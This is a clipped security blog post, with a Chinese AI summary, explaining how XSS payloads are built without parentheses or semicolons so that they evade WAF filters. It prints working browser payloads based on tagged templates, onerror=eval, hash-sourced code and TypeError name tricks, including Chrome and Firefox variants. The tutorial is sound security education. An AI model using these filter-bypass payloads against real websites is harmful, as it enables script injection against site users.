---
title: Explaining XSS without parentheses and semi-colons - Huli's blog
source: https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/
source_host: blog.huli.tw
clip_date: 2026-10-13T10:23:14+08:00
trace_id: e93cf3ca-01d2-4d98-92e8-d95ecdce08f2
content_hash: a0f1a21a51537e2fd0ad40de6b02e03b4e9a6a242d261d443a6fe369ac72cc27
status: synced
tags:
  - 漏洞分析
  - 风控对抗
series: null
feed_source: Huli·安全/逆向
ai_summary: |-
  用 `onerror`+`eval` 把报错信息变成合法 JS 代码执行，即可实现不含括号与分号的 XSS，核心目的是绕过 WAF 对特殊字符的拦截。
  - **无括号执行函数：** 标签模板字符串 `alert\`test\`` 可直接调用函数；`Function\`代码\`` 动态构造函数，再补一对反引号执行，代码中的括号可用 `\u0028`/`\u0029` 转义绕过。
  - **onerror 技巧：** `onerror=eval;throw '=alert(1)'`，因 Chrome 报错格式为 `Uncaught xxx`，抛出以 `=` 开头的字符串即可拼出 `Uncaught=alert(1)` 这类合法代码。
  - **无分号写法：** `throw` 是语句不能接在逗号后，可用代码块 `{onerror=alert}throw 1`，或逗号表达式 `throw onerror=alert,1`。
  - **Firefox 差异：** 报错格式为 `uncaught exception:`，故改为抛 Error 对象，使报错只剩 `Error:` 前缀可直接接代码；Firefox 已移除抛"类 Error 对象"的支持，新写法为 `throw onerror=eval,x=new Error,x.message='...',x`。
  - **其他 payload：** @terjanq 用 `URL+0` 取字符拼出 `/1/g(1337,3331,117)`；@cgvwzq 改 `TypeError.prototype.name` 把报错前缀变成正则 `/`，再借属性访问报错拼出可执行代码，需按 Chrome/Firefox 差异微调。
ai_summary_style: key-points
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3f875244-d011-812a-9327-c77e5a7cec16
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 用 `onerror`+`eval` 把报错信息变成合法 JS 代码执行，即可实现不含括号与分号的 XSS，核心目的是绕过 WAF 对特殊字符的拦截。
> - **无括号执行函数：** 标签模板字符串 `alert\`test\`` 可直接调用函数；`Function\`代码\`` 动态构造函数，再补一对反引号执行，代码中的括号可用 `\u0028`/`\u0029` 转义绕过。
> - **onerror 技巧：** `onerror=eval;throw '=alert(1)'`，因 Chrome 报错格式为 `Uncaught xxx`，抛出以 `=` 开头的字符串即可拼出 `Uncaught=alert(1)` 这类合法代码。
> - **无分号写法：** `throw` 是语句不能接在逗号后，可用代码块 `{onerror=alert}throw 1`，或逗号表达式 `throw onerror=alert,1`。
> - **Firefox 差异：** 报错格式为 `uncaught exception:`，故改为抛 Error 对象，使报错只剩 `Error:` 前缀可直接接代码；Firefox 已移除抛"类 Error 对象"的支持，新写法为 `throw onerror=eval,x=new Error,x.message='...',x`。
> - **其他 payload：** @terjanq 用 `URL+0` 取字符拼出 `/1/g(1337,3331,117)`；@cgvwzq 改 `TypeError.prototype.name` 把报错前缀变成正则 `/`，再借属性访问报错拼出可执行代码，需按 Chrome/Firefox 差异微调。

Recently, I received an email from a reader asking if I could write an article explaining [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons), saying that the payloads in it were hard to understand.

Therefore, this article will briefly explain these payloads, referencing Gareth Heyes’ two articles:

1.  [XSS technique without parentheses](https://thespanner.co.uk/2012/05/01/xss-technique-without-parentheses)
2.  [XSS without parentheses and semi-colons](https://portswigger.net/research/xss-without-parentheses-and-semi-colons)

## Why do we need such payloads?

Some might wonder, since we can execute JavaScript, why impose so many restrictions? The biggest reason is: WAF (Web Application Firewall). The most common one is Cloudflare’s WAF, which blocks you at the slightest hint of trouble. Even if you can insert HTML or even execute JavaScript, as long as it contains certain patterns, it will be blocked directly.

Moreover, certain situations may render some characters unusable, and at that point, creativity is needed to find ways to construct executable code without those characters.

## Starting with no parentheses

In JavaScript, it seems that to execute a function, parentheses are necessary. So what if we can’t use parentheses?

### Tagged template strings

The first method is something some developers may have used but might not think of immediately. Certain JavaScript libraries use template strings to execute functions, such as [Postgres.js](https://github.com/porsager/postgres?tab=readme-ov-file#usage):

```javascript
async function getUsersOver(age) {
  const users = await sql`
    select
      name,
      age
    from users
    where age > ${ age }
  `
  // users = Result [{ name: "Walter", age: 80 }, { name: 'Murray', age: 68 }, ...]
  return users
}
```

Those unfamiliar might wonder how this is written; isn’t it an SQL injection vulnerability?

If only template strings were used, then indeed it would be, but note that there is an additional `sql` at the front, which changes things. It is not just simple string concatenation; it is function execution, which is a JavaScript syntax. You can see the example below:

```javascript
function test(...args){
    console.log(args)
}

test`Hello ${'huli'}!!!${'good'}~~`
// [['Hello ', '!!!', '~~'], 'huli', 'good']
```

When we add a function at the front, the function’s parameters will receive the fixed parts of the original string and the inserted variables, allowing us to use this information for sanitization to avoid SQL injection. This usage is called tagged template strings.

The final effect is that it looks like a simple string replacement, but behind it is function execution with sanitization, making it safe.

Using this concept, we can write an XSS payload that does not require parentheses:

```javascript
alert`test`
```

However, some might ask, if that’s the case, can we only execute alert? Is there a way to execute arbitrary code? For example, if I want to use fetch to POST, I must use the second parameter: `fetch(url, { method:'POST'})`, and the method above would have the second parameter as an array, causing fetch to throw an error and not run.

To address this issue, we can first use the function constructor to create a function by passing in a string. If you’re not familiar with this, you can read: [How to write console.log(1) without using letters and numbers?](https://blog.huli.tw/2020/12/01/en/write-conosle-log-1-without-alphanumeric/) or [Intigriti’s 0521 XSS Challenge Solution: Limited Character Combination Code](https://blog.huli.tw/2021/06/07/en/xss-challenge-by-intigriti-writeup-may/), but I will briefly introduce it here.

In JavaScript, you can dynamically create a function using `new Function(code)`:

```javascript
new Function('alert(1)')
// anonymous() { alert(1) }
```

And that `new` is actually not necessary; you can remove it without any issue. Furthermore, dynamically created functions can accept parameters:

```javascript
new Function('a', 'alert(a+1)')
// anonymous(a) { alert(a+1) }

new Function('a', 'b', 'alert(a+b)')
// anonymous(a,b) { alert(a+b) }
```

The last parameter will be treated as the actual code, while the preceding ones will be treated as function parameters, and it will return the created function.

Therefore, we can use this point in conjunction with the tagged templates mentioned earlier to create a function from a string:

```javascript
Function`alert(1)`
// anonymous() { alert(1) }
```

So how do we execute this created function? It’s simple; just use the same method again:

```javascript
// Add two backticks at the end, just like the previously mentioned alert`1` usage
// Added an extra space to avoid Markdown parser issues, but it works the same either way

Function`alert(1)` ``
```

Since `alert(1)` inside is a string, the parentheses can be directly replaced with unicode, which is also a valid string representation, resulting in:

```javascript
// it's actually just alert(1)
Function`alert\u00281\u0029` ``
```

This way, the entire payload does not use any parentheses but can still execute arbitrary code!

This approach utilizes the first parameter when executing the template, which is the fixed part, but we can also use the subsequent parameters. For example:

```javascript
function test(a, b){
    console.log(a) // ['_', '']
    console.log(b) // hello
}

test`_${'hello'}`
```

When we pass both a fixed string and parameters simultaneously, the first parameter is all the fixed parts, as mentioned earlier, while the second parameter is our dynamically passed variable `hello`.

Using the method above to create a function, as previously mentioned, the last parameter will be treated as the function body:

```javascript
Function`_${'hello'}`
// anonymous(_,) { hello }
```

Thus, this `hello` is the part we can control. Since it is dynamically passed, there are many ways to play with it, which can be combined with places we can control on the website. For example, `location.hash` returns the hash from the URL like `#test`, and by adding `slice(1)`, we can remove the preceding `#`, combined it becomes:

```javascript
// start from this
Function`_${'hello'}`

// then using location.hash.slice(1)
Function`_${location.hash.slice(1)}`

// replace slice(1) with ``
Function`_${location.hash.slice`1`}`

// add `` to run the function
// remember to set the hash to #alert(1)
Function`_${location.hash.slice`1`}` ``
```

This constructs a payload that does not require parentheses but can execute arbitrary code, placing the actual string to be executed in the hash and dynamically executing the code in the hash.

All the previous writing has not yet gotten to the main point; the original discovery mentioned at the beginning is another more clever method.

In a browser environment, by using `window.onerror`, we can receive all uncaught error events:

```javascript
onerror = (err) => console.log('Err:' + err.toString())
throw 'hello';
// Err:Uncaught hello
```

By the way, the above code will not work if executed directly in DevTools (the reason is mentioned in the original post; errors will not be thrown to `onerror` when executed directly in the console), so please open an HTML to test.

In short, the above code tells us that in Chrome, the captured error message will be `Uncaught hello`.

So what if we directly replace `onerror` with `alert`?

```javascript
onerror = alert;
throw 'hello';
```

You will directly see a popup saying `Uncaught hello`. The above payload does not use any parentheses and achieves the purpose of executing a function.

Further extending this, we can replace `onerror` with `eval`, treating the error message as JavaScript code to execute, but the problem is how to construct valid code after replacing it with `eval`?

Since the captured error message will be: `Uncaught {payload}`, this entire sentence will be treated as code to execute, so as long as we replace the payload with: `=alert(1)`, the whole sentence becomes: `Uncaught=alert(1)`, using `Uncaught` in the error message as a variable, thus forming valid code:

```javascript
onerror = eval;
throw '=alert(1)';
```

If you still don’t understand the principle, replacing `eval` with `console.log` makes it very clear:

```javascript
onerror = console.log;
throw '=alert(1)';
// Uncaught =alert(1)
```

Next, since the string follows `throw`, we can also use encoding to replace it, using `\x28` or `\u0028` will work:

```javascript
onerror = eval;
throw '=alert\x281\u0029';
```

This constructs a payload that does not require parentheses.

## Further Eliminating Semicolons

Tagged template strings no longer require semicolons, so let’s continue along the path of `onerror` to see how to eliminate semicolons.

A simple and intuitive idea is to just use a comma (for convenience, I’ll use alert below):

```javascript
onerror=alert,throw 1;
```

But after running it, you’ll find an error: `Uncaught SyntaxError: Unexpected token 'throw'`. This is because `throw` is not an expression but a statement, so it cannot be placed after a comma; we need another method.

In JavaScript, even if you don’t use `if` or other code that requires a block, you can create your own block to wrap the code:

```javascript
{
  let a = 1;
  console.log(a)
}
```

This is indeed used in development (though not often), and its purpose is to deliberately create a block and use the `let` or `const` keywords, allowing variables to only exist within that block.

By utilizing a block, you can achieve the goal of separating code without needing semicolons:

```javascript
{onerror=alert}throw 1
```

In addition to using blocks, there are other cooler methods.

First, let’s talk about the use of commas in JavaScript. Basically, it concatenates several expressions and returns the result of the last one, such as:

```javascript
if (console.log(1), alert(1), true) {
    console.log(true)
} else {
    console.log(false)
}
// 1
// true
```

The expressions in `if` will sequentially execute `console.log(1)`, `alert(1)`, and finally return true, so the result of the `if` is valid, printing true.

And `throw` can be followed by an expression, so you can:

```javascript
throw onerror=alert,1
```

This will first execute `onerror=alert`, then execute `throw 1`, achieving the same effect as our method using `{}`. This is another way that doesn’t require semicolons.

The Chrome part ends here; the following is all efforts made for Firefox.

In Firefox, when there is an error, the format of the error message is different:

```javascript
onerror=alert;
throw 1;
// uncaught exception: 1
```

Under this error message, it’s impossible to construct valid code, and the previous suggestion of replacing `onerror` with `eval` no longer works.

So Gareth Heyes continued to dig deeper and discovered two things. The first is that if you throw an Error instead of a string, the error message won’t have those annoying prefixes, leaving just `Error:`:

```javascript
onerror=alert;
throw new Error(1);
// Error: 1
```

Since `Label:` is valid code in JavaScript, you can directly place code after it, making it easy:

```javascript
onerror=eval;
throw new Error('alert(1)');
```

However, using `Error()` introduces parentheses, and Gareth Heyes’ second discovery is that in Firefox, you can throw an error-like object to achieve the same effect:

```javascript
onerror=eval;
throw {lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'};
```

In summary, all of these efforts are to control the final error message produced by Firefox. As long as you can control it, you can construct valid code to pass to eval for execution.

Recently, I saw Gareth Heyes [tweet](https://x.com/garethheyes/status/1961078705293246513) that Firefox is going to remove this feature: [Firefox removed support for throwing error-like objects](https://github.com/PortSwigger/xss-cheatsheet-data/issues/103), so he found a new method:

```javascript
throw onerror=eval,x=new Error,x.message='alert\x281\x29',x
```

It seems that if you want to create a new Error, you can do it without parentheses. After creating an Error object, you can set the message, and you can still control the error message.

## Other payloads

There are other payloads mentioned by others in the original post.

The first one comes from [@terjanq](https://x.com/terjanq/status/1128692453047975936):

```javascript
throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337,3331,117]+a[13]
```

I tried this payload, and it currently only works in Chrome. It can clearly be broken down into several parts:

1.  `/a/`
2.  `Uncaught=1`
3.  `g=alert`
4.  `a=URL+0`
5.  `onerror=eval`
6.  `throw /1/g+a[12]+[1337,3331,117]+a[13]`

Because it is connected by commas, the part that gets thrown will be the last segment.

Let’s start with the last segment. What does `throw /1/g+a[12]+[1337,3331,117]+a[13]` do?

First, `a` is `URL+0`, and `URL` is a global function. The function + 0 will become a string, so `a` is `"function URL() { [native code] }0"`, thus `a[12]` and `a[13]` are `(` and `)` respectively.

The `/1/g` is a regexp, and when it becomes a string, it will be `"/1/g"`. As for the array `[1337,3331,117]`, when converted to a string, it will call `join`, resulting in `"1337,3331,117"`.

Putting it all together, `/1/g+a[12]+[1337,3331,117]+a[13]` will be `/1/g(1337,3331,117)`.

Combined with what was mentioned earlier, the error message thrown will be:

```
Uncaught /1/g(1337,3331,117)
```

Here, the `/` was previously treated as a regexp, but in the current code, it actually represents arithmetic division, i.e., `a / b / c`, where `a` is `Uncaught`, `b` is `1`, and `c` is `g(1337,3331,117)`.

If `Uncaught` is not declared, it will throw an error, which is why `Uncaught=1` is needed. Then `g` will be treated as a function, so `g=alert`.

What about the first line `/a/`? This is likely just to prevent a space between `throw` and the subsequent payload, and it doesn’t serve any other purpose.

The essence of this solution lies in making the error message become `Uncaught /1/g(1337,3331,117)` when thrown, which is a valid piece of code. As long as some prerequisites are fulfilled, it can successfully call the function `g`.

The second one comes from [@cgvwzq](https://x.com/cgvwzq):

```javascript
TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']
```

This is actually divided into two statements. The first statement is: `TypeError.prototype.name ='=/'`, which forcibly changes the name of `TypeError` to `=/`.

Without this line, the error message for `0[0]['test']` would be: `Uncaught TypeError: Cannot read properties of undefined (reading 'test')`.

`0[0]` will be undefined, and `undefined['test']` will throw this TypeError.

After we forcibly change the name:

```javascript
TypeError.prototype.name ='hello!';
0[0]['test'];
// Uncaught hello!: Cannot read properties of undefined (reading 'test')
```

We can control the original part of `TypeError` to become any string.

The other statement `0[onerror=eval]['/-alert(1)//']` simply places the assignment inside `[]`. After the assignment, it is equivalent to `0[eval]`, which will return undefined, thus throwing a TypeError.

Let’s look at it another way, with the following code:

```javascript
TypeError.prototype.name ='{1}';
0[eval]['{2}'];
```

The error message generated in Chrome would be:

```
Uncaught {1}: can't access property "{2}", 0[eval] is undefined
```

Now the problem becomes how to control the string above to make the error message a valid piece of code?

In place of `{1}`, the author placed `=/`, resulting in `Uncaught=/`. This `/` actually means regexp, so the idea of this method is to make the string before `{2}` (`: can't access property "` ) become part of the regexp.

Thus, the beginning of `{2}` is `/`, forming a regexp with the preceding part, and then using `-alert(1)` to execute the function. It can also be changed to `+alert(1)`, as it just needs to string the two operations together. After execution, the subsequent code is all commented out with `//`, so it can be ignored.

However, if you actually run the above payload, you will find that Chrome returns the error message: `Invalid regular expression ... Unterminated group`. This is because there is a `(` in the error message, which may not have been there, causing the regexp syntax to be incorrect. You just need to add a `)` to fix it:

```javascript
TypeError.prototype.name ='=/',0[onerror=eval][')/-alert(1)//']
```

The generated error message will be:

```javascript
Uncaught =/: Cannot read properties of undefined (reading ')/-alert(1)//')
```

A simplified version would be:

```javascript
Uncaught =/regexp/-alert(1)//...
```

By the way, this payload works fine on Chrome 139, but Firefox 142 will throw an error: `Uncaught SyntaxError: expected expression, got '='`.

If you want to debug, just change `onerror=eval` to `onerror=console.log` to see what the generated error message looks like:

```
=/: can't access property ")//alert(1)//", 0[console.log] is undefined
```

It seems that in Firefox, there is nothing in front of the TypeError’s name, so to make it work in Firefox, you can just add any character that can be a variable in front:

```javascript
TypeError.prototype.name ='a=/',0[onerror=eval]['/-alert(1)//']
```

If you really understand this approach, you can actually insert code at the TypeName part by following this idea, resulting in the same outcome, but not that cool (it works fine on Chrome):

```javascript
TypeError.prototype.name ='=alert(1)//',0[onerror=eval][2]
```

As for how to construct a payload that works on both Chrome and Firefox, readers can practice on their own or refer to an example I created, which adds some variations:

```javascript
TypeError.prototype.name ='+/[',[onerror=eval][window.Uncaught++][']/-alert\501\51<!--']
```

## Summary

In fact, regardless of which payload it is, the core concept is the same: just turn the error message into valid JavaScript code and pass it to eval for execution.

To understand the payload, you need to be somewhat familiar with JavaScript code, such as `0[onerror=eval]` or the use of commas; you should at least know what’s going on.

Besides that, it’s about using your imagination, which is harder to practice and usually starts with observation and imitation.

Finally, here are a few key points:

1.  Commas can chain multiple expressions, returning the last one.
2.  Replacing onerror with eval allows you to execute the error message as code.
3.  Errors thrown will become part of the error message.
4.  As long as you can turn the error message into valid code, you’ve succeeded.
